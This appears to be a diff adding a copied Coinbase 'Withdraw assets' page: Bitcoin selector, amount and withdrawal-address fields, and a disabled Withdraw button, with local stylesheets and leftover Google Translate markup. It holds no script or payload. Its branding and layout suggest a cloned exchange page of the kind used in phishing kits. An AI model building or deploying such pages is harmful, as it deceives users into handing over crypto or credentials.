@@ -1,0 +1,151 @@
+﻿
+<!DOCTYPE html>
+<html class="ll-fb" lang="en" style="background:#0a0b0d;">
+ <head>
+  <meta charset="utf-8"/>
+  <link rel="icon" href="/Coinbaselogo.png"/>
+  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+  <title>Coinbase - Withdraw</title>
+  <meta content="#000000" name="theme-color"/>
+  <link rel="stylesheet" href="css/flow-b-shell.css"/>
+  <link href="css/23.css" rel="stylesheet"/>
+  <style>
+html.ll-fb,
+html.ll-fb *,
+html.ll-fb *::before,
+html.ll-fb *::after {
+  font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif !important;
+}
+  </style>
+</head>
+ <body style="background:#0a0b0d;">
+  <div class="ll-fb-type" id="root">
+   <div class="h-full w-full flex-grow justify-between bg-coinbase-background sm:justify-start">
+    <div class="w-full px-6 pt-5">
+     <svg class="ll-fb-logo" height="32" viewbox="0 0 48 48" width="32" xmlns="http://www.w3.org/2000/svg">
+      <path d="M24,36c-6.63,0-12-5.37-12-12s5.37-12,12-12c5.94,0,10.87,4.33,11.82,10h12.09C46.89,9.68,36.58,0,24,0 C10.75,0,0,10.75,0,24s10.75,24,24,24c12.58,0,22.89-9.68,23.91-22H35.82C34.87,31.67,29.94,36,24,36z" fill="#FFFFFF">
+      </path>
+     </svg>
+    </div>
+    <div class="flex w-full flex-col items-center justify-center bg-coinbase-background pb-8">
+     <form class="mt-12 flex min-h-fit w-full max-w-md flex-col rounded-[16px] p-6 font-coinbase-text sm:mt-24 sm:border sm:border-coinbase-line sm:px-10 sm:py-8 sm:overflow-hidden">
+      <div class="flex flex-col" style="opacity: 1; transform: none;">
+       <span class="ll-fb-title pb-2 font-coinbase-title text-[28px] font-semibold text-white flex cursor-pointer items-center gap-2">
+        <svg class="lucide lucide-chevron-left h-6 w-6" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+         <path d="m15 18-6-6 6-6">
+         </path>
+        </svg>
+        Withdraw assets
+       </span>
+       <div class="relative mt-4">
+        <button class="flex w-full items-center justify-between rounded-lg p-2 text-white ring-1 ring-coinbase-line" type="button">
+         <div class="flex w-full items-center gap-2">
+          <div class="h-8 w-8 overflow-hidden rounded-full">
+           <svg class="web3icons h-full w-full" fill="none" height="24" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+            <g clip-path="url(#BTC__a)">
+             <path d="M24 0H0v24h24z" fill="#F7931A">
+             </path>
+             <path d="M18.011 10.432c.249-1.684-1.026-2.582-2.783-3.192l.57-2.27-1.388-.345-.553 2.214-1.107-.265.561-2.23L11.924 4l-.57 2.278-.882-.209v-.008L8.556 5.58l-.37 1.483s1.027.242 1.011.25c.562.144.658.513.642.801l-.642 2.599.145.048-.153-.032-.906 3.633c-.064.169-.241.425-.633.32.015.025-1.003-.24-1.003-.24l-.69 1.58 1.805.449.986.257-.577 2.302 1.387.344.562-2.277 1.114.288-.569 2.27 1.387.345.57-2.302c2.365.449 4.146.273 4.892-1.869.602-1.724-.032-2.71-1.275-3.368.906-.2 1.588-.802 1.764-2.03zm-3.168 4.443c-.425 1.725-3.328.786-4.266.561l.762-3.055c.938.24 3.954.698 3.504 2.486zm.425-4.467c-.385 1.564-2.807.77-3.585.578l.69-2.768c.786.193 3.304.562 2.895 2.19" fill="#fff">
+             </path>
+            </g>
+            <defs>
+             <clippath id="BTC__a">
+              <path d="M0 0h24v24H0z" fill="#fff">
+              </path>
+             </clippath>
+            </defs>
+           </svg>
+          </div>
+          <span class="flex-grow text-start text-sm font-bold text-white">
+           Bitcoin
+          </span>
+         </div>
+         <span class="pr-2 text-xs font-semibold text-coinbase-foreground-muted">
+          $
+          73,573.00
+         </span>
+         <svg class="lucide lucide-chevron-down h-4 w-4" fill="none" height="24" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" width="24" xmlns="http://www.w3.org/2000/svg">
+          <path d="m6 9 6 6 6-6">
+          </path>
+         </svg>
+        </button>
+       </div>
+       <div class="relative">
+        <div class="relative mt-5 flex w-full flex-col gap-2 text-left text-white">
+         <span class="text-sm font-semibold">
+          Amount
+         </span>
+         <input class="rounded-md border border-coinbase-line bg-coinbase-background px-4 py-3.5 font-coinbase-sans outline-none hover:bg-[#0f1012] focus:outline-coinbase-primary" inputmode="numeric" value="0.00000000"/>
+        </div>
+        <button class="absolute bottom-5 right-3 text-xs font-bold text-coinbase-foreground-muted" type="button">
+         WHAT
+        </button>
+       </div>
+       <span class="px-4 py-2 text-xs text-coinbase-foreground-muted">
+        ≈ $
+        0.00
+       </span>
+       <div class="relative mt-5 flex w-full flex-col gap-2 text-left text-white">
+        <span class="text-sm font-semibold">
+         Withdrawal address
+        </span>
+        <input class="rounded-md border border-coinbase-line bg-coinbase-background px-4 py-3.5 font-coinbase-sans outline-none hover:bg-[#0f1012] focus:outline-coinbase-primary" value=""/>
+       </div>
+       <button class="bg-coinbase-primary hover:bg-[#507fe5] disabled:bg-[#314b84] active:bg-[#4b78d6] disabled:scale-100 active:scale-[.98] mt-4 rounded-full py-4 flex font-coinbase-sans font-semibold pl-6 pr-8 text-black items-center transition-colors justify-center w-full" disabled="" type="button">
+        Withdraw
+       </button>
+       <span class="mt-4 w-full text-center text-xs text-coinbase-foreground-muted">
+        Withdrawals may take up to 24 hours to complete.
+       </span>
+      </div>
+      <div data-rht-toaster="" style="position: fixed; z-index: 9999; inset: 16px; pointer-events: none;">
+      </div>
+     </form>
+    </div>
+   </div>
+  </div>
+  <div class="skiptranslate" dir="ltr" id="goog-gt-tt">
+   <div style="padding: 8px;">
+    <div>
+     <div class="logo">
+      <img alt="Google Translate" height="20" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciLz4=" width="20"/>
+     </div>
+    </div>
+   </div>
+   <div class="top" style="padding: 8px; float: left; width: 100%;">
+    <h1 class="title gray">
+     Original text
+    </h1>
+   </div>
+   <div class="middle" style="padding: 8px;">
+    <div class="original-text">
+    </div>
+   </div>
+   <div class="bottom" style="padding: 8px;">
+    <div class="activity-links">
+     <span class="activity-link">
+      Contribute a better translation
+     </span>
+     <span class="activity-link">
+     </span>
+    </div>
+    <div class="started-activity-container">
+     <hr style="color: #CCC; background-color: #CCC; height: 1px; border: none;"/>
+     <div class="activity-root">
+     </div>
+    </div>
+   </div>
+   <div class="status-message" style="display: none;">
+   </div>
+  </div>
+  <div class="goog-te-spinner-pos">
+   <div class="goog-te-spinner-animation">
+    <svg class="goog-te-spinner" height="96px" viewbox="0 0 66 66" width="96px" xmlns="http://www.w3.org/2000/svg">
+     <circle class="goog-te-spinner-path" cx="33" cy="33" fill="none" r="30" stroke-linecap="round" stroke-width="6">
+     </circle>
+    </svg>
+   </div>
+  </div>
+ </body>
+</html>
+
